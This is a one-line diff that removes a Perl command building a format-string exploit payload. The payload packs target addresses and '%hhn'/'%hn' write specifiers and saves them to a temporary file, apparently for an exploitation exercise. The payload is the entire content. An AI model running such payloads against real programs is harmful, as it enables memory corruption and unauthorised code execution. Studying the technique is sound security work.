@@ -1,1 +1,0 @@
-perl -e 'print "\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08". "%c"x11 . "B"x45 . "%hhn" . "B"x17 . "%hhn" . "B"x173 . "%hn"' > /tmp/CMA_CGM
